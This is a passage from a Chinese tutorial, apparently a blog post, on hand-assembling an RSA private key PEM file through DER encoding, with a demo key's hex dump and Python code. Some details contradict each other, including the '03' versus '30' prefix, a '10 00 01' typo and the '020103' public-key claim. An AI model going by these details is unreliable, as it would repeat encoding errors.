class="number">87</span>ab<span class="number">1</span>bf<span class="number">7735</span>d<span class="number">834</span>d<span class="number">5</span>a<span class="number">3</span></span><br></pre></td></tr></table></figure><p>然后<strong>计算其「长度」</strong>，即：有几个字节（以上一个数字或字母算半个字节，故就是计算 len // 2）</p><p>用十六进制表示</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">n</span> = &#x27;<span class="number">009</span>c<span class="number">4</span>a<span class="number">79</span>b<span class="number">64</span>e<span class="number">02</span>d<span class="number">24</span>f<span class="number">8</span>e<span class="number">7</span>b<span class="number">1</span>bdb<span class="number">147</span>f<span class="number">2</span>f<span class="number">6</span>ac<span class="number">884</span>da<span class="number">5</span>f<span class="number">58061</span>d<span class="number">3633</span>a<span class="number">5</span>edfae<span class="number">21</span>a<span class="number">356</span>b<span class="number">2385</span>d<span class="number">1</span>fd<span class="number">941032553</span>bb<span class="number">794</span>c<span class="number">4</span>a<span class="number">1</span>e<span class="number">6</span>f<span class="number">2</span>a<span class="number">408</span>a<span class="number">0553</span>ac<span class="number">637633191</span>b<span class="number">168</span>e<span class="number">0</span>eb<span class="number">55032</span>a<span class="number">91</span>b<span class="number">067</span>dc<span class="number">45</span>b<span class="number">309</span>d<span class="number">5</span>b<span class="number">64780742</span>a<span class="number">9</span>fd<span class="number">85059464285922855229</span>f<span class="number">40</span>fbb<span class="number">969</span>f<span class="number">60</span>cce<span class="number">233</span>dca<span class="number">534</span>ce<span class="number">5</span>f<span class="number">43</span>a<span class="number">0</span>d<span class="number">9549</span>ed<span class="number">12190</span>d<span class="number">2</span>ca<span class="number">67</span>fbeac<span class="number">5</span>edbb<span class="number">87</span>ab<span class="number">1</span>bf<span class="number">7735</span>d<span class="number">834</span>d<span class="number">5</span>a<span class="number">3</span>&#x27;</span><br><span class="line"><span class="attribute">print</span>(hex(len(n)//<span class="number">2</span>))  # <span class="number">0</span>x<span class="number">81</span></span><br></pre></td></tr></table></figure><p>若长度大于<code>80</code>则辅助参数存在</p><ul><li><p>若长度需要一个字节表示，则辅助参数为<code>81</code></p><p>例如：长度为<code>81</code>,则表示为<code>81 81 具体数据</code></p></li><li><p>若长度需要两个字节表示，则辅助参数为<code>82</code></p><p>例如：长度为<code>025a</code>，则表示为<code>82 02 5a 具体数据</code></p></li></ul><p>回到测试私钥，n长度为<code>81</code>,则表示为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">81</span> <span class="number">81</span> <span class="number">00</span> <span class="number">9</span>c <span class="number">4</span>a <span class="number">79</span> b<span class="number">6</span> <span class="number">4</span>e <span class="number">02</span> d<span class="number">2</span> <span class="number">4</span>f <span class="number">8</span>e <span class="number">7</span>b <span class="number">1</span>b db <span class="number">14</span> <span class="number">7</span>f <span class="number">2</span>f <span class="number">6</span>a c<span class="number">8</span> <span class="number">84</span> da <span class="number">5</span>f <span class="number">58</span> <span class="number">06</span> <span class="number">1</span>d <span class="number">36</span> <span class="number">33</span> a<span class="number">5</span> ed fa e<span class="number">2</span> <span class="number">1</span>a <span class="number">35</span> <span class="number">6</span>b <span class="number">23</span> <span class="number">85</span> d<span class="number">1</span> fd <span class="number">94</span> <span class="number">10</span> <span class="number">32</span> <span class="number">55</span> <span class="number">3</span>b b<span class="number">7</span> <span class="number">94</span> c<span class="number">4</span> a<span class="number">1</span> e<span class="number">6</span> f<span class="number">2</span> a<span class="number">4</span> <span class="number">08</span> a<span class="number">0</span> <span class="number">55</span> <span class="number">3</span>a c<span class="number">6</span> <span class="number">37</span> <span class="number">63</span> <span class="number">31</span> <span class="number">91</span> b<span class="number">1</span> <span class="number">68</span> e<span class="number">0</span> eb <span class="number">55</span> <span class="number">03</span> <span class="number">2</span>a <span class="number">91</span> b<span class="number">0</span> <span class="number">67</span> dc <span class="number">45</span> b<span class="number">3</span> <span class="number">09</span> d<span class="number">5</span> b<span class="number">6</span> <span class="number">47</span> <span class="number">80</span> <span class="number">74</span> <span class="number">2</span>a <span class="number">9</span>f d<span class="number">8</span> <span class="number">50</span> <span class="number">59</span> <span class="number">46</span> <span class="number">42</span> <span class="number">85</span> <span class="number">92</span> <span class="number">28</span> <span class="number">55</span> <span class="number">22</span> <span class="number">9</span>f <span class="number">40</span> fb b<span class="number">9</span> <span class="number">69</span> f<span class="number">6</span> <span class="number">0</span>c ce <span class="number">23</span> <span class="number">3</span>d ca <span class="number">53</span> <span class="number">4</span>c e<span class="number">5</span> f<span class="number">4</span> <span class="number">3</span>a <span class="number">0</span>d <span class="number">95</span> <span class="number">49</span> ed <span class="number">12</span> <span class="number">19</span> <span class="number">0</span>d <span class="number">2</span>c a<span class="number">6</span> <span class="number">7</span>f be ac <span class="number">5</span>e db b<span class="number">8</span> <span class="number">7</span>a b<span class="number">1</span> bf <span class="number">77</span> <span class="number">35</span> d<span class="number">8</span> <span class="number">34</span> d<span class="number">5</span> a<span class="number">3</span> </span><br></pre></td></tr></table></figure><p>最后，<strong>加前缀（除<code>version</code>前缀是<code>30</code>外，其余数据前缀都是<code>02</code>)</strong></p><p>即：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">02</span> <span class="number">81</span> <span class="number">81</span> <span class="number">00</span> <span class="number">9</span>c <span class="number">4</span>a <span class="number">79</span> b<span class="number">6</span> <span class="number">4</span>e <span class="number">02</span> d<span class="number">2</span> <span class="number">4</span>f <span class="number">8</span>e <span class="number">7</span>b <span class="number">1</span>b db <span class="number">14</span> <span class="number">7</span>f <span class="number">2</span>f <span class="number">6</span>a c<span class="number">8</span> <span class="number">84</span> da <span class="number">5</span>f <span class="number">58</span> <span class="number">06</span> <span class="number">1</span>d <span class="number">36</span> <span class="number">33</span> a<span class="number">5</span> ed fa e<span class="number">2</span> <span class="number">1</span>a <span class="number">35</span> <span class="number">6</span>b <span class="number">23</span> <span class="number">85</span> d<span class="number">1</span> fd <span class="number">94</span> <span class="number">10</span> <span class="number">32</span> <span class="number">55</span> <span class="number">3</span>b b<span class="number">7</span> <span class="number">94</span> c<span class="number">4</span> a<span class="number">1</span> e<span class="number">6</span> f<span class="number">2</span> a<span class="number">4</span> <span class="number">08</span> a<span class="number">0</span> <span class="number">55</span> <span class="number">3</span>a c<span class="number">6</span> <span class="number">37</span> <span class="number">63</span> <span class="number">31</span> <span class="number">91</span> b<span class="number">1</span> <span class="number">68</span> e<span class="number">0</span> eb <span class="number">55</span> <span class="number">03</span> <span class="number">2</span>a <span class="number">91</span> b<span class="number">0</span> <span class="number">67</span> dc <span class="number">45</span> b<span class="number">3</span> <span class="number">09</span> d<span class="number">5</span> b<span class="number">6</span> <span class="number">47</span> <span class="number">80</span> <span class="number">74</span> <span class="number">2</span>a <span class="number">9</span>f d<span class="number">8</span> <span class="number">50</span> <span class="number">59</span> <span class="number">46</span> <span class="number">42</span> <span class="number">85</span> <span class="number">92</span> <span class="number">28</span> <span class="number">55</span> <span class="number">22</span> <span class="number">9</span>f <span class="number">40</span> fb b<span class="number">9</span> <span class="number">69</span> f<span class="number">6</span> <span class="number">0</span>c ce <span class="number">23</span> <span class="number">3</span>d ca <span class="number">53</span> <span class="number">4</span>c e<span class="number">5</span> f<span class="number">4</span> <span class="number">3</span>a <span class="number">0</span>d <span class="number">95</span> <span class="number">49</span> ed <span class="number">12</span> <span class="number">19</span> <span class="number">0</span>d <span class="number">2</span>c a<span class="number">6</span> <span class="number">7</span>f be ac <span class="number">5</span>e db b<span class="number">8</span> <span class="number">7</span>a b<span class="number">1</span> bf <span class="number">77</span> <span class="number">35</span> d<span class="number">8</span> <span class="number">34</span> d<span class="number">5</span> a<span class="number">3</span> </span><br></pre></td></tr></table></figure><p>同理依次处理好e、d、p、q、dp、dq、qi后，拼接即可</p><p><strong>而至于<code>version</code>则分为两部分</strong></p><ul><li><strong>文件总长数据 + 私钥判断数据</strong></li></ul><p>由资料，n前数据为<strong>私钥判断数据</strong>，只有以下两种形式</p><ul><li>020103 公钥</li><li>020100 私钥</li></ul><p>这里生成私钥文件，故：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">02</span> <span class="number">01</span> <span class="number">00</span> <span class="number">02</span> <span class="number">81</span> <span class="number">81</span> <span class="number">00</span> <span class="number">9</span>c <span class="number">4</span>a <span class="number">79</span> b<span class="number">6</span> <span class="number">4</span>e <span class="number">02</span> d<span class="number">2</span> <span class="number">4</span>f <span class="number">8</span>e <span class="number">7</span>b <span class="number">1</span>b db <span class="number">14</span> <span class="number">7</span>f <span class="number">2</span>f <span class="number">6</span>a c<span class="number">8</span> <span class="number">84</span> da <span class="number">5</span>f <span class="number">58</span> <span class="number">06</span> <span class="number">1</span>d <span class="number">36</span> <span class="number">33</span> a<span class="number">5</span> ed fa e<span class="number">2</span> <span class="number">1</span>a <span class="number">35</span> <span class="number">6</span>b <span class="number">23</span> <span class="number">85</span> d<span class="number">1</span> fd <span class="number">94</span> <span class="number">10</span> <span class="number">32</span> <span class="number">55</span> <span class="number">3</span>b b<span class="number">7</span> <span class="number">94</span> c<span class="number">4</span> a<span class="number">1</span> e<span class="number">6</span> f<span class="number">2</span> a<span class="number">4</span> <span class="number">08</span> a<span class="number">0</span> <span class="number">55</span> <span class="number">3</span>a c<span class="number">6</span> <span class="number">37</span> <span class="number">63</span> <span class="number">31</span> <span class="number">91</span> b<span class="number">1</span> <span class="number">68</span> e<span class="number">0</span> eb <span class="number">55</span> <span class="number">03</span> <span class="number">2</span>a <span class="number">91</span> b<span class="number">0</span> <span class="number">67</span> dc <span class="number">45</span> b<span class="number">3</span> <span class="number">09</span> d<span class="number">5</span> b<span class="number">6</span> <span class="number">47</span> <span class="number">80</span> <span class="number">74</span> <span class="number">2</span>a <span class="number">9</span>f d<span class="number">8</span> <span class="number">50</span> <span class="number">59</span> <span class="number">46</span> <span class="number">42</span> <span class="number">85</span> <span class="number">92</span> <span class="number">28</span> <span class="number">55</span> <span class="number">22</span> <span class="number">9</span>f <span class="number">40</span> fb b<span class="number">9</span> <span class="number">69</span> f<span class="number">6</span> <span class="number">0</span>c ce <span class="number">23</span> <span class="number">3</span>d ca <span class="number">53</span> <span class="number">4</span>c e<span class="number">5</span> f<span class="number">4</span> <span class="number">3</span>a <span class="number">0</span>d <span class="number">95</span> <span class="number">49</span> ed <span class="number">12</span> <span class="number">19</span> <span class="number">0</span>d <span class="number">2</span>c a<span class="number">6</span> <span class="number">7</span>f be ac <span class="number">5</span>e db b<span class="number">8</span> <span class="number">7</span>a b<span class="number">1</span> bf <span class="number">77</span> <span class="number">35</span> d<span class="number">8</span> <span class="number">34</span> d<span class="number">5</span> a<span class="number">3</span> <span class="number">02</span> <span class="number">03</span> <span class="number">10</span> <span class="number">00</span> <span class="number">01</span> ...</span><br></pre></td></tr></table></figure><p>而私钥判断数据前的文件总长数据结构如下</p><p>专属前缀<code>03</code> + <code>len（总文件）</code></p><p>同样的这里的len计算、填充方式同上</p><p>（长度大于80要辅助参数，因为其后数据为私钥判断数据+其他参数，第一字节固定为<code>02</code>，所以不可能补<code>00</code>）</p><p>于是，最终测试数据产生的（十六进制）私钥文件为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">30</span> <span class="number">82</span> <span class="number">02</span> <span class="number">5</span>a <span class="number">02</span> <span class="number">01</span> <span class="number">00</span> <span class="number">02</span> <span class="number">81</span> <span class="number">81</span> <span class="number">00</span> <span class="number">9</span>c <span class="number">4</span>a <span class="number">79</span> b<span class="number">6</span> <span class="number">4</span>e</span><br><span class="line"><span class="attribute">02</span> d<span class="number">2</span> <span class="number">4</span>f <span class="number">8</span>e <span class="number">7</span>b <span class="number">1</span>b db <span class="number">14</span> <span class="number">7</span>f <span class="number">2</span>f <span class="number">6</span>a c<span class="number">8</span> <span class="number">84</span> da <span class="number">5</span>f <span class="number">58</span></span><br><span class="line"><span class="attribute">06</span> <span class="number">1</span>d <span class="number">36</span> <span class="number">33</span> a<span class="number">5</span> ed fa e<span class="number">2</span> <span class="number">1</span>a <span class="number">35</span> <span class="number">6</span>b <span class="number">23</span> <span class="number">85</span> d<span class="number">1</span> fd <span class="number">94</span></span><br><span class="line"><span class="attribute">10</span> <span class="number">32</span> <span class="number">55</span> <span class="number">3</span>b b<span class="number">7</span> <span class="number">94</span> c<span class="number">4</span> a<span class="number">1</span> e<span class="number">6</span> f<span class="number">2</span> a<span class="number">4</span> <span class="number">08</span> a<span class="number">0</span> <span class="number">55</span> <span class="number">3</span>a c<span class="number">6</span></span><br><span class="line"><span class="attribute">37</span> <span class="number">63</span> <span class="number">31</span> <span class="number">91</span> b<span class="number">1</span> <span class="number">68</span> e<span class="number">0</span> eb <span class="number">55</span> <span class="number">03</span> <span class="number">2</span>a <span class="number">91</span> b<span class="number">0</span> <span class="number">67</span> dc <span class="number">45</span></span><br><span class="line"><span class="attribute">b3</span> <span class="number">09</span> d<span class="number">5</span> b<span class="number">6</span> <span class="number">47</span> <span class="number">80</span> <span class="number">74</span> <span class="number">2</span>a <span class="number">9</span>f d<span class="number">8</span> <span class="number">50</span> <span class="number">59</span> <span class="number">46</span> <span class="number">42</span> <span class="number">85</span> <span class="number">92</span></span><br><span class="line"><span class="attribute">28</span> <span class="number">55</span> <span class="number">22</span> <span class="number">9</span>f <span class="number">40</span> fb b<span class="number">9</span> <span class="number">69</span> f<span class="number">6</span> <span class="number">0</span>c ce <span class="number">23</span> <span class="number">3</span>d ca <span class="number">53</span> <span class="number">4</span>c</span><br><span class="line"><span class="attribute">e5</span> f<span class="number">4</span> <span class="number">3</span>a <span class="number">0</span>d <span class="number">95</span> <span class="number">49</span> ed <span class="number">12</span> <span class="number">19</span> <span class="number">0</span>d <span class="number">2</span>c a<span class="number">6</span> <span class="number">7</span>f be ac <span class="number">5</span>e</span><br><span class="line"><span class="attribute">db</span> b<span class="number">8</span> <span class="number">7</span>a b<span class="number">1</span> bf <span class="number">77</span> <span class="number">35</span> d<span class="number">8</span> <span class="number">34</span> d<span class="number">5</span> a<span class="number">3</span> <span class="number">02</span> <span class="number">03</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span></span><br><span class="line"><span class="attribute">02</span> <span class="number">7</span>f <span class="number">05</span> <span class="number">51</span> f<span class="number">1</span> <span class="number">64</span> fa <span class="number">1</span>e <span class="number">43</span> <span class="number">0</span>a <span class="number">72</span> <span class="number">3</span>c e<span class="number">3</span> <span class="number">23</span> <span class="number">91</span> fc</span><br><span class="line"><span class="attribute">c2</span> <span class="number">57</span> <span class="number">4</span>d e<span class="number">9</span> ca <span class="number">17</span> <span class="number">74</span> c<span class="number">3</span> <span class="number">09</span> a<span class="number">9</span> <span class="number">3</span>c <span class="number">61</span> fb dc <span class="number">69</span> d<span class="number">5</span></span><br><span class="line"><span class="attribute">e8</span> <span class="number">44</span> bd <span class="number">5</span>e <span class="number">87</span> a<span class="number">2</span> d<span class="number">0</span> f<span class="number">9</span> bc <span class="number">2</span>a <span class="number">98</span> <span class="number">4</span>b <span class="number">82</span> e<span class="number">9</span> <span class="number">77</span> bd</span><br><span class="line"><span class="attribute">f7</span> <span class="number">16</span> c<span class="number">2</span> eb <span class="number">44</span> <span class="number">8</span>d bb <span class="number">9</span>f <span class="number">4</span>b <span class="number">9</span>c <span class="number">88</span> eb <span class="number">5</span>c <span class="number">82</span> <span class="number">02</span> <span class="number">5</span>c</span><br><span class="line"><span class="attribute">2b</span> <span class="number">9</span>a cc <span class="number">05</span> bc <span class="number">24</span> <span class="number">4</span>a <span class="number">50</span> a<span class="number">9</span> <span class="number">8</span>a <span class="number">22</span> <span class="number">8</span>f <span class="number">20</span> <span class="number">2</span>c <span class="number">5</span>f b<span class="number">2</span></span><br><span class="line"><span class="attribute">e2</span> <span class="number">15</span> cb <span class="number">6</span>f <span class="number">2</span>b <span class="number">00</span> e<span class="number">1</span> ec <span class="number">33</span> fe f<span class="number">6</span> <span class="number">0</span>d ff e<span class="number">3</span> eb cd</span><br><span class="line"><span class="attribute">d3</span> c<span class="number">0</span> b<span class="number">5</span> a<span class="number">3</span> ed fc fd <span class="number">89</span> <span class="number">7</span>f <span class="number">68</span> <span class="number">06</span> <span class="number">66</span> <span class="number">50</span> <span class="number">78</span> b<span class="number">2</span> <span class="number">67</span></span><br><span class="line"><span class="attribute">18</span> f<span class="number">5</span> fd <span class="number">33</span> ee db <span class="number">97</span> d<span class="number">7</span> <span class="number">88</span> <span class="number">73</span> d<span class="number">6</span> <span class="number">11</span> e<span class="number">4</span> d<span class="number">7</span> <span class="number">3</span>a <span class="number">8</span>d</span><br><span class="line"><span class="attribute">f1</span> <span class="number">02</span> <span class="number">41</span> <span class="number">00</span> c<span class="number">7</span> <span class="number">68</span> f<span class="number">8</span> <span class="number">11</span> b<span class="number">9</span> d<span class="number">6</span> <span class="number">66</span> e<span class="number">0</span> <span class="number">11</span> ae d<span class="number">0</span> <span class="number">22</span></span><br><span class="line"><span class="attribute">8b</span> b<span class="number">4</span> f<span class="number">9</span> <span class="number">8</span>f <span class="number">62</span> <span class="number">2</span>e <span class="number">85</span> <span class="number">3</span>e <span class="number">14</span> b<span class="number">0</span> <span class="number">3</span>f <span class="number">94</span> d<span class="number">1</span> <span class="number">85</span> a<span class="number">3</span> <span class="number">16</span></span><br><span class="line"><span class="attribute">7c</span> <span class="number">10</span> <span class="number">89</span> <span class="number">6</span>a <span class="number">70</span> <span class="number">27</span> <span class="number">91</span> <span class="number">7</span>a ee e<span class="number">2</span> <span class="number">12</span> <span class="number">16</span> a<span class="number">0</span> <span class="number">3</span>a <span class="number">30</span> <span class="number">79</span></span><br><span class="line"><span class="attribute">f6</span> bf <span class="number">42</span> df <span class="number">54</span> <span class="number">4</span>e <span class="number">5</span>e <span class="number">00</span> <span class="number">35</span> fd <span class="number">90</span> f<span class="number">6</span> <span class="number">1</span>a d<span class="number">8</span> <span class="number">57</span> <span class="number">19</span></span><br><span class="line"><span class="attribute">b3</span> <span class="number">44</span> f<span class="number">5</span> <span class="number">49</span> <span class="number">02</span> <span class="number">41</span> <span class="number">00</span> c<span class="number">8</span> a<span class="number">4</span> ed <span class="number">11</span> <span class="number">26</span> <span class="number">4</span>f <span class="number">57</span> <span class="number">7</span>d b<span class="number">2</span></span><br><span class="line"><span class="attribute">7c</span> <span class="number">0</span>c <span class="number">1</span>d <span class="number">2</span>d <span class="number">2</span>a aa <span class="number">59</span> <span class="number">1</span>e <span class="number">64</span> <span class="number">60</span> ae ec c<span class="number">1</span> <span class="number">1</span>c <span class="number">24</span> <span class="number">41</span></span><br><span class="line"><span class="attribute">c0</span> b<span class="number">2</span> <span class="number">62</span> <span class="number">1</span>c a<span class="number">5</span> <span class="number">90</span> <span class="number">68</span> ea af <span class="number">82</span> b<span class="number">4</span> f<span class="number">2</span> <span class="number">41</span> <span class="number">16</span> <span class="number">29</span> <span class="number">0</span>e</span><br><span class="line"><span class="attribute">55</span> <span class="number">53</span> ca e<span class="number">8</span> <span class="number">7</span>d <span class="number">35</span> <span class="number">20</span> cf <span class="number">7</span>b <span class="number">02</span> <span class="number">90</span> <span class="number">1</span>c b<span class="number">4</span> ad <span class="number">8</span>e b<span class="number">9</span></span><br><span class="line"><span class="attribute">ea</span> db <span class="number">64</span> <span class="number">15</span> <span class="number">21</span> <span class="number">6</span>f <span class="number">8</span>b <span class="number">02</span> <span class="number">40</span> <span class="number">52</span> <span class="number">5</span>f <span class="number">4</span>a <span class="number">1</span>a <span class="number">08</span> <span class="number">6</span>a <span class="number">48</span></span><br><span class="line"><span class="attribute">94</span> c<span class="number">6</span> b<span class="number">9</span> <span class="number">2</span>f c<span class="number">1</span> <span class="number">15</span> <span class="number">74</span> ec a<span class="number">2</span> <span class="number">0</span>e <span class="number">2</span>c a<span class="number">9</span> <span class="number">5</span>d bb ae <span class="number">12</span></span><br><span class="line"><span class="attribute">95</span> a<span class="number">6</span> f<span class="number">7</span> <span class="number">4</span>d <span class="number">27</span> <span class="number">3</span>c <span class="number">98</span> <span class="number">98</span> <span class="number">2</span>b <span class="number">1</span>f a<span class="number">9</span> <span class="number">38</span> af <span class="number">4</span>f <span class="number">7</span>e <span class="number">93</span></span><br><span class="line"><span class="attribute">7a</span> <span class="number">45</span> <span class="number">35</span> c<span class="number">4</span> <span class="number">50</span> <span class="number">9</span>d <span class="number">5</span>c e<span class="number">4</span> <span class="number">82</span> dc <span class="number">90</span> <span class="number">82</span> c<span class="number">4</span> <span class="number">13</span> <span class="number">89</span> <span class="number">6</span>b</span><br><span class="line"><span class="attribute">18</span> <span class="number">3</span>e <span class="number">7</span>e <span class="number">9</span>f <span class="number">7</span>c <span class="number">3</span>e <span class="number">51</span> <span class="number">7</span>e <span class="number">01</span> <span class="number">02</span> <span class="number">41</span> <span class="number">00</span> ab b<span class="number">4</span> e<span class="number">0</span> a<span class="number">0</span></span><br><span class="line"><span class="attribute">3d</span> <span class="number">8</span>d c<span class="number">6</span> cc ee <span class="number">32</span> d<span class="number">4</span> <span class="number">57</span> <span class="number">1</span>f b<span class="number">1</span> <span class="number">14</span> <span class="number">89</span> <span class="number">21</span> c<span class="number">6</span> <span class="number">3</span>b <span class="number">2</span>b</span><br><span class="line"><span class="attribute">57</span> b<span class="number">7</span> <span class="number">47</span> <span class="number">33</span> <span class="number">0</span>c <span class="number">06</span> <span class="number">31</span> <span class="number">62</span> <span class="number">5</span>f <span class="number">2</span>b <span class="number">9</span>c f<span class="number">2</span> fc <span class="number">6</span>c <span class="number">68</span> ca</span><br><span class="line"><span class="attribute">1b</span> <span class="number">4</span>b <span class="number">72</span> <span class="number">00</span> <span class="number">7</span>e a<span class="number">0</span> ad <span class="number">0</span>d c<span class="number">7</span> <span class="number">7</span>a <span class="number">67</span> <span class="number">3</span>e <span class="number">05</span> f<span class="number">1</span> <span class="number">3</span>a <span class="number">57</span></span><br><span class="line"><span class="attribute">44</span> <span class="number">09</span> a<span class="number">7</span> <span class="number">41</span> ae <span class="number">7</span>f <span class="number">7</span>b <span class="number">73</span> <span class="number">21</span> d<span class="number">6</span> <span class="number">34</span> <span class="number">53</span> <span class="number">02</span> <span class="number">40</span> <span class="number">29</span> <span class="number">44</span></span><br><span class="line"><span class="attribute">2a</span> <span class="number">88</span> <span class="number">90</span> <span class="number">79</span> <span class="number">82</span> bb <span class="number">83</span> <span class="number">00</span> dd b<span class="number">3</span> <span class="number">52</span> <span class="number">22</span> <span class="number">66</span> <span class="number">7</span>a <span class="number">2</span>e <span class="number">5</span>e</span><br><span class="line"><span class="attribute">e0</span> <span class="number">74</span> <span class="number">1</span>f <span class="number">0</span>f a<span class="number">5</span> cb b<span class="number">5</span> <span class="number">69</span> <span class="number">8</span>a a<span class="number">6</span> <span class="number">2</span>c fd <span class="number">17</span> a<span class="number">4</span> <span class="number">4</span>b cb</span><br><span class="line"><span class="attribute">56</span> <span class="number">64</span> d<span class="number">1</span> b<span class="number">3</span> <span class="number">80</span> <span class="number">2</span>d <span class="number">94</span> <span class="number">71</span> <span class="number">0</span>e <span class="number">8</span>b <span class="number">56</span> <span class="number">5</span>d <span class="number">1</span>a e<span class="number">3</span> <span class="number">5</span>c a<span class="number">0</span></span><br><span class="line"><span class="attribute">0c</span> c<span class="number">8</span> <span class="number">72</span> b<span class="number">2</span> bd <span class="number">87</span> <span class="number">8</span>b <span class="number">15</span> <span class="number">9</span>d <span class="number">74</span> <span class="number">68</span> f<span class="number">8</span> <span class="number">94</span> c<span class="number">9</span></span><br></pre></td></tr></table></figure><p>最后base64加密之，每64个字符为一行，前加<code>-----BEGIN RSA PRIVATE KEY-----</code>,后加<code>-----END RSA PRIVATE KEY-----</code>即可</p><p>总代码如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"># private key</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shex(num):</span><br><span class="line">    tmp = <span class="built_in">str</span>(<span class="built_in">hex</span>(num))[<span class="number">2</span>:]</span><br><span class="line">    if <span class="built_in">len</span>(tmp) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    return tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="built_in">hlen</span>(hstring):</span><br><span class="line">    tmp = <span class="built_in">shex</span>(<span class="built_in">len</span>(hstring) // <span class="number">2</span>)</span><br><span class="line">    if <span class="built_in">len</span>(tmp) == <span class="number">1</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    return tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="built_in">construct</span>(num, T=<span class="number">0</span>):</span><br><span class="line">    if T == <span class="number">0</span>:</span><br><span class="line">        num = <span class="built_in">shex</span>(num)</span><br><span class="line">    if <span class="built_in">int</span>(num[:<span class="number">2</span>], <span class="number">16</span>) &gt;= <span class="number">0</span>x80:</span><br><span class="line">        num = <span class="string">&#x27;00&#x27;</span> + num</span><br><span class="line">    LEN = <span class="built_in">hlen</span>(num)</span><br><span class="line">    if <span class="built_in">int</span>(LEN, <span class="number">16</span>) &gt;= <span class="number">0</span>x80:</span><br><span class="line">        if <span class="built_in">int</span>(<span class="built_in">hlen</span>(LEN), <span class="number">16</span>) == <span class="number">1</span>:</span><br><span class="line">            return <span class="string">&#x27;81&#x27;</span> + LEN + num</span><br><span class="line">        if <span class="built_in">int</span>(<span class="built_in">hlen</span>(LEN), <span class="number">16</span>) == <span class="number">2</span>:</span><br><span class="line">            return <span class="string">&#x27;82&#x27;</span> + LEN + num</span><br><span class="line">    return <span class="built_in">hlen</span>(num) + num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="built_in">hpad</span>(data, T=<span class="number">0</span>):  # 默认不是文件头, 是就T=<span class="number">1</span></span><br><span class="line">    return <span class="string">&#x27;02&#x27;</span> + <span class="built_in">construct</span>(data, T) if T == <span class="number">0</span> else <span class="string">&#x27;30&#x27;</span> + <span class="built_in">construct</span>(data, T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">151036135413139226687867011199700639084856588533884431118047808395603993635242690166659649156476428533386350427603713487259266502837260466348398817558768025404903682189934563578605367223796247470920497617904900418615352839562681665973088711089128789315193951623751145385357347144960284983398745189236464272961</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="number">66980701583036734736960294391078312622827897052791813876359026247918495979594634282982071853820451331222681673373427663666376575651344098661059603483956134335089509308267535247063609325195212704938058730366660923446510585605669518343968880619319880983999690229384618652977238799179660803464509489433199564801</span></span><br><span class="line">q = <span class="number">12112790828812363063315417237469719611888243756064158121348026938824270601623590308149025542977097905953795136774300936003505715307199422663647014200158449</span></span><br><span class="line">p = <span class="number">12469144192094336933187534132907623337514842804208163244218540727384104398951558782195384932941310035462094951428865175221316720981428462265191789302379089</span></span><br><span class="line">dq = <span class="number">11498252026215339897996227126317442002148273807959830401838708697653776075624560175939807697631738024706616156507054180549156927547667584459935731684701121</span></span><br><span class="line">dp = <span class="number">11263269100321843418340309033584057768246046953115325020896491943793759194249558697334095131684279304657225064156696057310019203890620314290203835007881649</span></span><br><span class="line">qi = <span class="number">230121277324731969722527349653498610340545443290131539298194061889386294775484298329444143510348368415044353961014184478364151608769305026976078967964618</span></span><br><span class="line"></span><br><span class="line">pk = <span 